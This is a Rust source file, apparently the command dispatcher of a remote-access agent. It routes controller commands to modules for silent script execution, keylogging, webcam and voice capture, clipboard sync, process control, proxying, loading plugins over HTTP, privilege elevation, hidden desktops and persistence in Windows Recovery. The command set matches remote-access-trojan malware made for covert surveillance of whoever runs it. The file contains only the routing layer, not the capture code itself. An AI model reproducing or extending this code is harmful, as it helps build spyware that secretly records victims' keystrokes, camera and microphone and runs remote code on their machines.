use std::sync::Arc;

use crate::{
    protocol::{self, Obj, Value},
    state::{Command, Outbound, State},
};

pub mod audio;
pub mod backstage;
pub mod clipboard;
pub mod console;
pub mod desktop;
pub mod exec;
pub mod files;
pub mod input;
pub mod keylogger;
pub mod net;
pub mod plugin;
pub mod process;
pub mod proxy;
pub mod screenshot;
pub mod system;
pub mod virtual_desktop;
pub mod webcam;
pub mod webrtc;
pub mod winre;

pub struct Ctx {
    pub command: Command,
    pub out: Outbound,
    pub state: Arc<State>,
}

impl Ctx {
    pub fn payload(&self) -> &Value {
        &self.command.payload
    }

    pub fn string(&self, key: &str) -> Option<&str> {
        protocol::string_field(&self.command.payload, key)
    }

    pub fn string_or(&self, key: &str, default: &str) -> String {
        self.string(key).unwrap_or(default).to_owned()
    }

    pub fn integer(&self, key: &str) -> Option<i64> {
        protocol::integer_field(&self.command.payload, key)
    }

    pub fn integer_or(&self, key: &str, default: i64) -> i64 {
        self.integer(key).unwrap_or(default)
    }

    pub fn boolean_or(&self, key: &str, default: bool) -> bool {
        protocol::bool_field(&self.command.payload, key).unwrap_or(default)
    }

    pub fn bytes(&self, key: &str) -> Option<&[u8]> {
        protocol::bytes_field(&self.command.payload, key)
    }
}

pub async fn dispatch(ctx: Ctx) {
    let name = ctx.command.name.as_str();
    if protocol::command_version_range(name).is_none() {
        ctx.out
            .result_with_code(&ctx.command, false, Some("unknown command"), Some("unknown_command"))
            .await;
        return;
    }
    let (min, max) = protocol::command_version_range(name).unwrap();
    if ctx.command.version < min || ctx.command.version > max {
        let supported = Obj::new()
            .put(protocol::key_min(), protocol::n(min as i64))
            .put(protocol::key_max(), protocol::n(max as i64))
            .value();
        let message = format!("unsupported {name} command version {}", ctx.command.version);
        ctx.out
            .send(
                Obj::new()
                    .put(protocol::key_type(), protocol::s("command_result"))
                    .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
                    .put(protocol::key_command_type(), protocol::s(&ctx.command.name))
                    .put(protocol::key_command_version(), protocol::n(ctx.command.version as i64))
                    .put(protocol::key_ok(), protocol::b(false))
                    .put(protocol::key_message(), protocol::s(&message))
                    .put(protocol::key_error_code(), protocol::s("unsupported_command_version"))
                    .put(protocol::key_supported_versions(), supported)
                    .value(),
            )
            .await;
        return;
    }

    match name {
        "agent_update" | "uninstall" | "disconnect" | "reconnect" | "elevate" | "privacy_start"
        | "privacy_stop" | "privacy_status" | "client_logs_request" | "darwin_request_permissions" => {
            system::handle(ctx).await
        }
        "script_exec" | "silent_exec" => exec::handle(ctx).await,
        "screenshot" => screenshot::handle(ctx).await,
        "process_list" | "process_icon" | "process_kill" | "process_suspend" | "process_resume" => {
            process::handle(ctx).await
        }
        "console_start" | "console_input" | "console_resize" | "console_stop" => {
            console::handle(ctx).await
        }
        "clipboard_get" | "clipboard_set" | "clipboard_sync_start" | "clipboard_sync_stop" => {
            clipboard::handle(ctx).await
        }
        "keylog_request_permission" | "keylog_list" | "keylog_retrieve" | "keylog_clear_all"
        | "keylog_delete" => keylogger::handle(ctx).await,
        "proxy_connect" | "proxy_data" | "proxy_close" => proxy::handle(ctx).await,
        "plugin_load" | "plugin_load_http" | "plugin_unload" => plugin::handle(ctx).await,
        "winre_install" | "winre_probe" | "winre_uninstall" => winre::handle(ctx).await,
        "webcam_start" | "webcam_stop" | "webcam_list" | "webcam_select" | "webcam_set_fps"
        | "webcam_set_quality" => webcam::handle(ctx).await,
        "voice_session_start" | "voice_session_stop" | "voice_downlink" | "voice_capabilities"
        | "desktop_audio_start" | "desktop_audio_stop" => audio::handle(ctx).await,
        "webrtc_publish" | "webrtc_stop" | "webrtc_p2p_offer" | "webrtc_p2p_ice"
        | "webrtc_p2p_stop" => webrtc::handle(ctx).await,
        _ if name.starts_with("backstage_") => backstage::handle(ctx).await,
        _ if name.starts_with("virtual_") => virtual_desktop::handle(ctx).await,
        _ if name.starts_with("desktop_") => desktop::handle(ctx).await,
        _ if name.starts_with("file_") => files::handle(ctx).await,
        _ => {
            ctx.out
                .result_with_code(&ctx.command, false, Some("unknown command"), Some("unknown_command"))
                .await
        }
    }
}
